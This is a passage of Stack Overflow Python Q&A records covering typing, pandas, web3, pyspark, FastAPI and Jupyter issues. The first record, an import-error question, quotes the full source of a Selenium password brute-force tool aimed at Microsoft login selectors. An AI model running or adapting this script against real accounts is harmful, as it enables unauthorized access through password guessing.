    "Body": "I am editing a file in VS code. VS code gives the following error: Import \"selenium\" could not be resolved Pylance (reportMissingImports).\nThis is the code from metachar:\n# Coded and based by METACHAR/Edited and modified for Microsoft by Major\nimport sys\nimport datetime\nimport selenium\nimport requests\nimport time as t\nfrom sys import stdout\nfrom selenium import webdriver\nfrom optparse import OptionParser\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.common.exceptions import NoSuchElementException\n\n# Graphics\nclass color:\n   PURPLE = '\\033[95m'\n   CYAN = '\\033[96m'\n   DARKCYAN = '\\033[36m'\n   BLUE = '\\033[94m'\n   GREEN = '\\033[92m'\n   YELLOW = '\\033[93m'\n   RED = '\\033[91m'\n   BOLD = '\\033[1m'\n   UNDERLINE = '\\033[4m'\n   END = '\\033[0m'\n   CWHITE  = '\\33[37m'\n\n# Config#\nparser = OptionParser()\nnow = datetime.datetime.now()\n\n# Args\nparser.add_option(\"--passsel\", dest=\"passsel\",help=\"Choose the password selector\")\nparser.add_option(\"--loginsel\", dest=\"loginsel\",help= \"Choose the login button selector\")\nparser.add_option(\"--passlist\", dest=\"passlist\",help=\"Enter the password list directory\")\nparser.add_option(\"--website\", dest=\"website\",help=\"choose a website\")\n(options, args) = parser.parse_args()\n\nCHROME_DVR_DIR = '/home/major/Hatch/chromedriver'\n\n# Setting up Brute-Force function\ndef wizard():\n    print (banner)\n    website = raw_input(color.GREEN + color.BOLD + '\\n[~] ' + color.CWHITE + 'Enter a website: ')\n    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),\n    sys.stdout.flush()\n    t.sleep(1)\n    try:\n        request = requests.get(website)\n        if request.status_code == 200:\n            print (color.GREEN + '[OK]'+color.CWHITE)\n            sys.stdout.flush()\n    except selenium.common.exceptions.NoSuchElementException:\n        pass\n    except KeyboardInterrupt:\n        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')\n        exit()\n    except:\n        t.sleep(1)\n        print (color.RED + '[X]'+color.CWHITE)\n        t.sleep(1)\n        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')\n        exit()\n    password_selector = '#i0118'\n    login_btn_selector = '#idSIButton9'\n    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')\n    brutes(password_selector,login_btn_selector,pass_list, website)\n\n# Execute Brute-Force function\ndef brutes(password_selector,login_btn_selector,pass_list, website):\n    f = open(pass_list, 'r')\n    driver = webdriver.Chrome(CHROME_DVR_DIR)\n    optionss = webdriver.ChromeOptions()\n    optionss.add_argument(\"--disable-popup-blocking\")\n    optionss.add_argument(\"--disable-extensions\")\n    count = 1\n    browser = webdriver.Chrome(CHROME_DVR_DIR)\n    while True:\n        try:\n            for line in f:\n                browser.get(website)\n                t.sleep(1)\n                Sel_pas = browser.find_element_by_css_selector(password_selector)\n                enter = browser.find_element_by_css_selector(login_btn_selector) \n                Sel_pas.send_keys(line)\n                t.sleep(2)\n                print ('------------------------')\n                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN)\n                print ('------------------------')\n                temp = line \n        except KeyboardInterrupt: \n            exit()\n        except selenium.common.exceptions.NoSuchElementException:\n            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')\n            print ('LAST PASS ATTEMPT BELLOW')\n            print (color.GREEN + 'Password has been found: {0}'.format(temp))\n            print (color.YELLOW + 'Have fun :)')\n            exit()\n\nbanner = color.BOLD + color.RED +'''\n  _    _       _       _\n | |  | |     | |     | |\n | |__| | __ _| |_ ___| |__ \n |  __  |/ _` | __/ __| '_ \\\\\n | |  | | (_| | || (__| | | |\n |_|  |_|\\__,_|\\__\\___|_| |_|\n  {0}[{1}-{2}]--> {3}V.1.0\n  {4}[{5}-{6}]--> {7}coded by Metachar\n  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)\n\ndriver = webdriver.Chrome(CHROME_DVR_DIR)\noptionss = webdriver.ChromeOptions()\noptionss.add_argument(\"--disable-popup-blocking\")\noptionss.add_argument(\"--disable-extensions\")\ncount = 1 \n\nif options.passsel == None:\n    if options.loginsel == None:\n        if options.passlist == None:\n            if options.website == None:\n                wizard()\n\npassword_selector = options.passsel\nlogin_btn_selector = options.loginsel\nwebsite = options.website\npass_list = options.passlist\nprint (banner)\nbrutes(password_selector,login_btn_selector,pass_list, website)\n\nI have downloaded the windows chromedriver. I don't know where I must place it on my computer. Does anyone have an idea where I must place it and how I can solve this error. When I try it in Linux, I get not an error. I placed the chromedriver in the same dir as the python file. When I do the exact same thing in windows it does not work. Can anyone help me out?\n",
    "AcceptedAnswerId": 71325202,
    "AcceptedAnswer": "PyLance looks for the \"selenium\" python package and cannot find it in the configured python installation. Since you're using VSCode, make sure you've configured the python extension properly. When you open a .py file in VSCode, you should see a python setting in the status bar down below on the left. Select the installation on which you've installed selenium and PyLance will find your import.\n"
}
{
    "Id": 71491107,
    "PostTypeId": 1,
    "Title": "Formatting guidelines for type aliases",
    "Body": "What would be the correct way to format the name of a type alias\u2014intended to be local to its module\u2014according to the PEP8 style guide?\n# mymodule.py\nfrom typing import TypeAlias\n\nmytype: TypeAlias = int\n\ndef f() -> mytype:\n    return mytype()\n\ndef g() -> mytype:\n    return mytype()\n\nShould mytype be formatted in CapWords because it introduces a new type similar to creating new classes? Or, should mytype be formatted in all caps because it is treated similarly to a constant?\nIs there a way to differentiate between type aliases that will remain unchanged (constant) throughout the lifetime of the program and ones that can change (similar to the Final annotation for constants)?\nAlso, should mytype be prefixed with an underscore (as in _mytype) to indicate that the type alias shouldn't be used outside this module?\n",
    "AcceptedAnswerId": 71491175,
    "AcceptedAnswer": "The PEP Style Guide does not have any explicit guidance on how to format TypeAliases. The guide does contain some rules on type variables, but that's not quite what you're asking for.\n\nThe next best resource I could find was Google's Python Style Guide, which does happen to contain some guidance on how to name TypeAliases:\n\n3.19.6 Type Aliases\nYou can declare aliases of complex types. The name of an alias should be CapWorded. If the alias is used only in this module, it should be _Private.\nFor example, if the name of the module together with the name of the type is too long:\n_ShortName = module_with_long_name.TypeWithLongName\nComplexMap = Mapping[str, List[Tuple[int, int]]]\n\nOther examples are complex nested types and multiple return variables from a function (as a tuple).\n\nUnder this, the name of your type alias should be MyType if used across multiple modules, or _MyType if only used in the module that it is declared in.\n\nWith all of this being said, remember that consistency with the existing codebase is what's most important. As the PEP style guide states:\n\nA style guide is about consistency. Consistency with this style guide is important. Consistency within a project is more important. Consistency within one module or function is the most important.\n\n"
}
{
    "Id": 70879159,
    "PostTypeId": 1,
    "Title": "Get datetime format from string python",
    "Body": "In Python there are multiple DateTime parsers which can parse a date string automatically without providing the datetime format. My problem is that I don't need to cast the datetime, I only need the datetime format.\nExample:\nFrom \"2021-01-01\", I want something like \"%Y-%m-%d\" or \"yyyy-MM-dd\".\nMy only idea was to try casting with different formats and get the successful one, but I don't want to list every possible format.\nI'm working with pandas, so I can use methods that work either with series or the string DateTime parser.\nAny ideas?\n",
    "AcceptedAnswerId": 70879221,
    "AcceptedAnswer": "In pandas, this is achieved by pandas._libs.tslibs.parsing.guess_datetime_format\nfrom pandas._libs.tslibs.parsing import guess_datetime_format\n\nguess_datetime_format('2021-01-01')\n\n# '%Y-%m-%d'\n\nAs there will always be an ambiguity on the day/month, you can specify the dayfirst case:\nguess_datetime_format('2021-01-01', dayfirst=True)\n# '%Y-%d-%m'\n\n"
}
{
    "Id": 70794199,
    "PostTypeId": 1,
    "Title": "Use of colon ':' in type hints",
    "Body": "When type annotating a variable of type dict, typically you'd annotate it like this:\nnumeralToInteger: dict[str, int] = {...}\n\nHowever I rewrote this using a colon instead of a comma:\nnumeralToInteger: dict[str : int] = {...}\n\nAnd this also works, no SyntaxError or NameError is raised.\nUpon inspecting the __annotations__ global variable:\ncolon: dict[str : int] = {...}\ncomma: dict[str, int] = {...}\n\nprint(__annotations__)\n\nThe output is:\n{'colon': dict[slice(, , None)],\n 'comma': dict[str, int]}\n\nSo the colon gets treated as a slice object and the comma as a normal type hint.\nShould I use the colon with dict types or should I stick with using a comma?\nI am using Python version 3.10.1.\n",
    "AcceptedAnswerId": 70794389,
    "AcceptedAnswer": "If you have a dictionary whose keys are strings and values are integers, you should do dict[str, int]. It's not optional. IDEs and type-checkers use these type hints to help you. When you say dict[str : int], it is a slice object. Totally different things.\nTry these in mypy playground:\nd: dict[str, int]\nd = {'hi': 20}\n\nc: dict[str: int]\nc = {'hi': 20}\n\nmessage:\nmain.py:4: error: \"dict\" expects 2 type arguments, but 1 given\nmain.py:4: error: Invalid type comment or annotation\nmain.py:4: note: did you mean to use ',' instead of ':' ?\nFound 2 errors in 1 file (checked 1 source file)\n\nError messages are telling everything\n"
}
{
    "Id": 70731492,
    "PostTypeId": 1,
    "Title": "The transaction declared chain ID 5777, but the connected node is on 1337",
    "Body": "I am trying to deploy my SimpleStorage.sol contract to a ganache local chain by making a transaction using python. It seems to have trouble connecting to the chain.\nfrom solcx import compile_standard\nfrom web3 import Web3\nimport json\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nwith open(\"./SimpleStorage.sol\", \"r\") as file:\n    simple_storage_file = file.read()\n\ncompiled_sol = compile_standard(\n    {\n        \"language\": \"Solidity\",\n        \"sources\": {\"SimpleStorage.sol\": {\"content\": simple_storage_file}},\n        \"settings\": {\n            \"outputSelection\": {\n                \"*\": {\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]}\n            }\n        },\n    },\n    solc_version=\"0.6.0\",\n)\n\nwith open(\"compiled_code.json\", \"w\") as file:\n    json.dump(compiled_sol, file)\n\n\n# get bytecode\nbytecode = compiled_sol[\"contracts\"][\"SimpleStorage.sol\"][\"SimpleStorage\"][\"evm\"][\n    \"bytecode\"\n][\"object\"]\n\n\n# get ABI\nabi = compiled_sol[\"contracts\"][\"SimpleStorage.sol\"][\"SimpleStorage\"][\"abi\"]\n\n# to connect to ganache blockchain\nw3 = Web3(Web3.HTTPProvider(\"HTTP://127.0.0.1:7545\"))\nchain_id = 5777\nmy_address = \"0xca1EA31e644F13E3E36631382686fD471c62267A\"\nprivate_key = os.getenv(\"PRIVATE_KEY\")\n\n\n# create the contract in python\n\nSimpleStorage = w3.eth.contract(abi=abi, bytecode=bytecode)\n\n# get the latest transaction\nnonce = w3.eth.getTransactionCount(my_address)\n\n# 1. Build a transaction\n# 2. Sign a transaction\n# 3. Send a transaction\n\n\ntransaction = SimpleStorage.constructor().buildTransaction(\n    {\"chainId\": chain_id, \"from\": my_address, \"nonce\": nonce}\n)\nprint(transaction)\n\n\nIt seems to be connected to the ganache chain because it prints the nonce, but when I build and try to print the transaction\nhere is the entire traceback call I am receiving\nTraceback (most recent call last):\nFile \"C:\\Users\\evens\\demos\\web3_py_simple_storage\\deploy.py\", line \n52, in \ntransaction = SimpleStorage.constructor().buildTransaction(\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\decorators.py\", line \n18, in _wrapper\nreturn self.method(obj, *args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\contract.py\", line 684, in buildTransaction\nreturn fill_transaction_defaults(self.web3, built_transaction)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\_utils\\transactions.py\", line 114, in \nfill_transaction_defaults\ndefault_val = default_getter(web3, transaction)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\_utils\\transactions.py\", line 60, in \n'gas': lambda web3, tx: web3.eth.estimate_gas(tx),\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\eth.py\", line 820, in estimate_gas\nreturn self._estimate_gas(transaction, block_identifier)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\module.py\", line 57, in caller\nresult = w3.manager.request_blocking(method_str,\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\manager.py\", line 197, in request_blocking\nresponse = self._make_request(method, params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\manager.py\", line 150, in _make_request\nreturn request_func(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 76, in \napply_formatters\nresponse = make_request(method, params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\gas_price_strategy.py\", line 90, in \nmiddleware\nreturn make_request(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 74, in \napply_formatters\nresponse = make_request(method, formatted_params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\attrdict.py\", line 33, in middleware\nresponse = make_request(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 74, in \napply_formatters\nresponse = make_request(method, formatted_params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 73, in \napply_formatters\nformatted_params = formatter(params)\nFile \"cytoolz/functoolz.pyx\", line 503, in \ncytoolz.functoolz.Compose.__call__\nret = PyObject_Call(self.first, args, kwargs)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\decorators.py\", line \n91, in wrapper\nreturn ReturnType(result)  # type: ignore\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\applicators.py\", line \n22, in apply_formatter_at_index\nyield formatter(item)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\applicators.py\", line \n72, in apply_formatter_if\nreturn formatter(value)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\validation.py\", line 57, in \nvalidate_chain_id\nraise ValidationError(\nweb3.exceptions.ValidationError: The transaction declared chain ID \n5777, but the connected node is on 1337\n\n",
    "AcceptedAnswerId": 70745821,
    "AcceptedAnswer": "Had this issue myself, apparently it's some sort of Ganache CLI error but the simplest fix I could find was to change the network id in Ganache through settings>server to 1337. It restarts the session so you'd then need to change the address and private key variable.\nIf it's the same tutorial I'm doing, you're likely to come unstuck after this... the code for transaction should be:\ntransaction = \n SimpleStorage.constructor().buildTransaction( {\n    \"gasPrice\": w3.eth.gas_price, \n    \"chainId\": chain_id, \n    \"from\": my_address, \n    \"nonce\": nonce, \n})\nprint(transaction)\n\nOtherwise you get a value error if you don't set the gasPrice\n"
}
{
    "Id": 70753091,
    "PostTypeId": 1,
    "Title": "*Why* does object() not support `setattr`, but derived classes do?",
    "Body": "Today I stumbled upon the following behaviour:\nclass myobject(object):\n    \"\"\"Should behave the same as object, right?\"\"\"\n\nobj = myobject()\nobj.a = 2        # <- works\nobj = object()\nobj.a = 2        # AttributeError: 'object' object has no attribute 'a'\n\nI want to know what is the logic behind designing the language to behave this way, because it feels utterly paradoxical to me. It breaks my intuition that if I create a subclass, without modification, it should behave the same as the parent class.\n\nEDIT: A lot of the answers suggest that this is because we want to be able to write classes that work with __slots__ instead of __dict__ for performance reasons. However, we can do:\nclass myobject_with_slots(myobject):\n    __slots__ = (\"x\",)\n    \nobj = myobject_with_slots()\nobj.x = 2\nobj.a = 2\nassert \"a\" in obj.__dict__      # \u2714\nassert \"x\" not in obj.__dict__  # \u2714\n\nSo it seems we can have both __slots__ and __dict__ at the same time, so why doesn't object allow both, but one-to-one subclasses do?\n",
    "AcceptedAnswerId": 70753129,
    "AcceptedAnswer": "Because derived classes do not necessarily support setattr either.\nclass myobject(object):\n    \"\"\"Should behave the same as object!\"\"\"\n    __slots__ = ()\n\nobj = myobject()\nobj.a = 2        # <- works the same as for object\n\nSince all types derive from object, most builtin types such as list are also examples.\nArbitrary attribute assignment is something that object subclasses may support, but not all do. Thus, the common base class does not support this either.\n\nSupport for arbitrary attributes is commonly backed by the so-called __dict__ slot. This is a fixed attribute that contains a literal dict 1 to store any attribute-value pairs.\nIn fact, one can manually define the __dict__ slot to get arbitrary attribute support.\nclass myobject(object):\n    \"\"\"Should behave the same as object, right?\"\"\"\n    __slots__ = (\"__dict__\",)\n\nobj = myobject()\nobj.a = 2            # <- works!\nprint(obj.__dict__)  # {'a': 2}\n\nThe takeaway from this demonstration is that fixed attributes is actually the \"base behaviour\" of Python; the arbitrary attributes support is built on top when required.\nAdding arbitrary attributes for object subtypes by default provides a simpler programming experience. However, still supporting fixed attributes for object subtypes allows for better memory usage and performance.\n\nData Model: __slots__\nThe space saved [by __slots__] over using __dict__ can be significant. Attribute lookup speed can be significantly improved as well.\n\nNote that it is possible to define classes with both fixed attributes and arbitrary attributes. The fixed attributes will benefit from the improved memory layout and performance; since they are not stored in the __dict__, its memory overhead2 is lower \u2013 but it still costs.\n\n1Python implementations may use different, optimised types  for __dict__ as long as they behave like a dict.\n2For its hash-based lookup to work efficiently with few collisions, a dict must be larger than the number of items it stores.\n"
}
{
    "Id": 70967266,
    "PostTypeId": 1,
    "Title": "what exactly is python typing.Callable?",
    "Body": "I have seen typing.Callable, but I didn't find any useful docs about it. What exactly is typing.Callable?\n",
    "AcceptedAnswerId": 70967371,
    "AcceptedAnswer": "typing.Callable is the type you use to indicate a callable. Most python types that support the () operator are of the type collections.abc.Callable. Examples include functions, classmethods, staticmethods, bound methods and lambdas.\nIn summary, anything with a __call__ method (which is how () is implemented), is a callable.\nPEP 677 attempted to introduce implicit tuple-with-arrow syntax, so that something like Callable[[int, str], list[float]] could be expressed much more intuitively as (int, str) -> list[float]. The PEP was rejected because the benefits of the new syntax were not deemed sufficient given the added maintenance burden and possible room for confusion.\n"
}
{
    "Id": 70801888,
    "PostTypeId": 1,
    "Title": "Ignore the first space in CSV",
    "Body": "I have a CSV file like this:\nTime              Latitude Longitude\n2021-09-12 23:13    44.63     -63.56\n2021-09-14 23:13    43.78     -62\n2021-09-16 23:14    44.83     -54.6\n\n2021-09-12 23:13 is under Time column.\nI would like to open it using pandas. But there is a problem with the first column. It contains a space. If I open it using:\nimport pandas as pd\npoints = pd.read_csv(\"test.csv\", delim_whitespace=True) \n\nI get\n\n\n\n\n\nTime\nLatitude\nLongitude\n\n\n\n\n2021-09-12\n23:13\n44.630\n-63.560\n\n\n2021-09-14\n23:13\n43.780\n-62.000\n\n\n2021-09-16\n23:14\n44.830\n-54.600\n\n\n\n\nBut I would like to skip the space in the first column in CSV (2021-09-12 23:13 should be under Time column) like:\n\n\n\n\n\nTime\nLatitude\nLongitude\n\n\n\n\n0\n2021-09-12 23:13\n44.630\n-63.560\n\n\n1\n2021-09-14 23:13\n43.780\n-62.000\n\n\n2\n2021-09-16 23:14\n44.830\n-54.600\n\n\n\n\nHow can I ignore the first space when using pd.read_csv?\nPlease do not stick to this csv file. This is a general question to skip (not to consider as a delimiter) the first space(s) in the first column. Because everyone knows that the first space is part of the time value, not a delimiter.\n",
    "AcceptedAnswerId": 70834357,
    "AcceptedAnswer": "Ideally you should be parsing the first two parts as a datetime. By using a space as a delimiter, it would imply the header has three columns. The space after the date though is being seen as an extra column.\nA workaround is to skip the header entirely and supply your own column names. The parse_dates parameter can be used to tell Pandas to parse the first two columns as a single combined datetime object.\nFor example:\nimport pandas as pd\n\npoints = pd.read_csv(\"test.csv\", delimiter=\" \", \n    skipinitialspace=True, skiprows=1, index_col=None, \n    parse_dates=[[0, 1]], names=[\"Date\", \"Time\", \"Latitude\", \"Longitude\"])\n\nprint(points)\n\nShould give you the following dataframe:\n            Date_Time  Latitude  Longitude\n0 2021-09-12 23:13:00     44.63     -63.56\n1 2021-09-14 23:13:00     43.78     -62.00\n2 2021-09-16 23:14:00     44.83     -54.60\n\n"
}
{
    "Id": 70888992,
    "PostTypeId": 1,
    "Title": "unittest.mock vs mock vs mocker vs pytest-mock",
    "Body": "I am new to Python development, I am writing test cases using pytest where I need to mock some behavior. Googling best mocking library for pytest, has only confused me. I have seen unittest.mock, mock, mocker and pytest-mock. Not really sure which one to use.Can someone please explain me the difference between them and also recommend me one?\n",
    "AcceptedAnswerId": 70889128,
    "AcceptedAnswer": "So pytest-mock is a thin wrapper around mock and mock is since python 3.3. actually the same as unittest.mock. I don't know if mocker is another library, I only know it as the name of the fixture provided by pytest-mock to get mocking done in your tests. I personally use pytest and pytest-mock for my tests, which allows you to write very concise tests like\nfrom pytest_mock import MockerFixture\n@pytest.fixture(autouse=True)\ndef something_to_be_mocked_everywhere(mocker):\n    mocker.patch()\n\n\ndef tests_this(mocker: MockerFixture):\n    mocker.patch ...\n    a_mock = mocker.Mock() ...\n    ...\n\nBut this is mainly due to using fixtures, which is already pointed out is what pytest-mock offers.\n"
}
{
    "Id": 70753768,
    "PostTypeId": 1,
    "Title": "Jupyter Notebook: Access to the file was denied",
    "Body": "I'm trying to run a Jupyter notebook on Ubuntu 21.10. I've installed python, jupyter notebook, and all the various prerequisites. I added export PATH=$PATH:~/.local/bin to my bashrc so that the command jupyter notebook would be operational from the terminal.\nWhen I call jupyter notebook from the terminal, I get the following error message from my browser:\nAccess to the file was denied.\n\nThe file at /home/username/.local/share/jupyter/runtime/nbserver-260094-open.html is not readable.\n\n    It may have been removed, moved, or file permissions may be preventing access.\n\nI'm using the latest version of FireFox.\nI've read a number of guides on this and it seems to be a permissions error, but none of the guides that I've used have resolved the issue. Using sudo does not help, in fact it causes Exception: Jupyter command \"jupyter-notebook\" not found. to be thrown.\nThat being said, I am still able to access the notebook server. If I go to the terminal and instead click on the localhost:8888 or IP address of the notebook server then it takes me to the notebook and everything runs without issue.\nI would like to solve this so that when I run jupyter notebook I'm taken to the server and don't need to go back to the terminal window and click the IP address. It's inconvenient and can slow me down if I'm running multiple notebooks at once.\nAny help on this issue would be greatly appreciated!\n",
    "AcceptedAnswerId": 70753901,
    "AcceptedAnswer": "I had the same problem.\nUbuntu 20.04.3 LTS\nChromium Version 96.0.4664.110\nThis was the solution in my case:\nCreate the configuration file with this command:\njupyter notebook --generate-config\n\nEdit the configuration file ~/.jupyter/jupyter_notebook_config.py and set:\nc.NotebookApp.use_redirect_file = False\n\nMake sure that this configuration parameter starts at the beginning of the line. If you leave one space at the beginning of the line, you will get the message that access to the file was denied.\nOtherwise you can clean and reinstall JupyterLab\njupyter lab clean --all\npip3 install jupyterlab --force-reinstall\n\n"
}
{
    "Id": 70894409,
    "PostTypeId": 1,
    "Title": "pyspark get element from array Column of struct based on condition",
    "Body": "I have a spark df with the following schema:\n |-- col1 : string\n |-- col2 : string\n |-- customer: struct\n |    |-- smt: string\n |    |-- attributes: array (nullable = true)\n |    |    |-- element: struct\n |    |    |     |-- key: string\n |    |    |     |-- value: string\n\ndf:\n#+-------+-------+---------------------------------------------------------------------------+\n#|col1   |col2   |customer                                                                   |\n#+-------+-------+---------------------------------------------------------------------------+\n#|col1_XX|col2_XX|\"attributes\":[[{\"key\": \"A\", \"value\": \"123\"},{\"key\": \"B\", \"value\": \"456\"}]  |\n#+-------+-------+---------------------------------------------------------------------------+\n\nand the json input for the array look like this:\n...\n          \"attributes\": [\n            {\n              \"key\": \"A\",\n              \"value\": \"123\"\n            },\n            {\n              \"key\": \"B\",\n              \"value\": \"456\"\n            }\n          ],\n\nI would like to loop attributes array and get the element with key=\"B\" and then select the corresponding value. I don't want to use explode because I would like to avoid join dataframes.\nIs it possible to perform this kind of operation directly using spark 'Column' ?\nExpected output will be:\n#+-------+-------+-----+\n#|col1   |col2   |B    |                                                               |\n#+-------+-------+-----+\n#|col1_XX|col2_XX|456  |\n#+-------+-------+-----+\n\nany help would be appreciated\n",
    "AcceptedAnswerId": 70895004,
    "AcceptedAnswer": "You can use filter function to filter the array of structs then get value:\nfrom pyspark.sql import functions as F\n\ndf2 = df.withColumn(\n    \"B\", \n    F.expr(\"filter(customer.attributes, x -> x.key = 'B')\")[0][\"value\"]\n)\n\n"
}
{
    "Id": 71500756,
    "PostTypeId": 1,
    "Title": "What is Python's \"Namespace\" object?",
    "Body": "I know what namespaces are. But when running\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument('bar')\nparser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')\n\nWhat kind of object is Namespace(bar='XXX')? I find this totally confusing.\nReading the argparse docs, it says \"Most ArgumentParser actions add some value as an attribute of the object returned by parse_args()\".  Shouldn't this object then appear when running globals()? Or how can I introspect it?\n",
    "AcceptedAnswerId": 71500890,
    "AcceptedAnswer": "Samwise's answer is very good, but let me answer the other part of the question.\n\nOr how can I introspect it?\n\nBeing able to introspect objects is a valuable skill in any language, so let's approach this as though Namespace is a completely unknown type.\n>>> obj = parser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')\n\nYour first instinct is good. See if there's a Namespace in the global scope, which there isn't.\n>>> Namespace\nTraceback (most recent call last):\n  File \"\", line 1, in \nNameError: name 'Namespace' is not defined\n\nSo let's see the actual type of the thing. The Namespace(bar='XXX') printer syntax is coming from a __str__ or __repr__ method somewhere, so let's see what the type actually is.\n>>> type(obj)\n\n\nand its module\n>>> type(obj).__module__\n'argparse'\n\nNow it's a pretty safe bet that we can do from argparse import Namespace and get the type. Beyond that, we can do\n>>> help(argparse.Namespace)\n\nin the interactive interpreter to get detailed documentation on the Namespace class, all with no Internet connection necessary.\n"
}
{
    "Id": 70854314,
    "PostTypeId": 1,
    "Title": "Use FastAPI to interact with async loop",
    "Body": "I am running coroutines of 'workers' whose job it is to wait 5s, get values from an asyncio.Queue() and print them out continually.\nq = asyncio.Queue()\n\ndef worker():\n    while True:\n        await asyncio.sleep(5)\n        i = await q.get()\n        print(i)\n        q.task_done()\n\nasync def main(q):\n    workers = [asyncio.create_task(worker()) for n in range(10)]\n    await asyncio.gather(*workers)\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n\nI would like to be able to interact with the queue through http requests using FastAPI. For example POST requests that would 'put' items in the queue for the workers to print.\nI'm unsure how I can run the coroutines of the workers concurrently with FastAPI to achieve this effect. Uvicorn has its own event loop I believe and my attempts to use asyncio methods have been unsuccessful.\nThe router would look something like this I think.\n@app.post(\"/\")\nasync def put_queue(data:str):\n    return q.put(data)\n\nAnd I'm hoping there's something that would have an effect like this:\nawait asyncio.gather(main(),{FastApi() app run})\n\n",
    "AcceptedAnswerId": 70900417,
    "AcceptedAnswer": "One option would be to add a task that wraps your main coroutine in a on startup event\nimport asyncio\n@app.on_event(\"startup\")\nasync def startup_event():\n    asyncio.create_task(main())\n\n\nThis would schedule your main coroutine before the app has been fully started.\nImportant here is that you don't await the created task as it would basically block startup_event forever\n"
}
{
    "Id": 70836912,
    "PostTypeId": 1,
    "Title": "Use mysql.connector , but get ImportError: Missing optional dependency 'SQLAlchemy'",
    "Body": "I work on a program for two months.\nToday I suddenly got an error when connecting to the database while using mysql.connector.\nInterestingly, this error is not seen when running previous versions.\nimport mysql.connector\nimport pandas as pd\n\nmydb = mysql.connector.connect(host=\"localhost\", user=\"root\", password=\"*****\", \ndatabase=\"****\")\n\nQ = f'SELECT * FROM table'\ndf = pd.read_sql_query(Q, con=mydb)\n\nprint(df)\n\nbut I get this error :\nTraceback (most recent call last):\ndf = pd.read_sql_query(Q, con=mydb)\nFile \"g.v1.6\\venv\\lib\\site-packages\\pandas\\io\\sql.py\", line \n398, in read_sql_query\npandas_sql = pandasSQL_builder(con)\nFile \"g.v1.6\\venv\\lib\\site-packages\\pandas\\io\\sql.py\", line \n750, in pandasSQL_builder\nsqlalchemy = import_optional_dependency(\"sqlalchemy\")\nFile \"g.v1.6\\venv\\lib\\site- \npackages\\pandas\\compat\\_optional.py\", line 129, in import_optional_dependency\nraise ImportError(msg)\nImportError: Missing optional dependency 'SQLAlchemy'.  Use pip or conda to install \nSQLAlchemy.\n\nWhat has this got to do with SQLAlchemy??\n",
    "AcceptedAnswerId": 70852553,
    "AcceptedAnswer": "I just ran into something similar. It looks like Pandas 1.4 was released on January 22, 2022:\nhttps://pandas.pydata.org/docs/dev/whatsnew/v1.4.0.html\nIt has an \"optional\" dependency on SQLAlchemy, which is required to communicate with any database other than sqlite now, as the comment by snakecharmerb mentioned. Once I added that to my requirements and installed SQLAlchemy, it resolved my problem.\n"
}
{
    "Id": 70982008,
    "PostTypeId": 1,
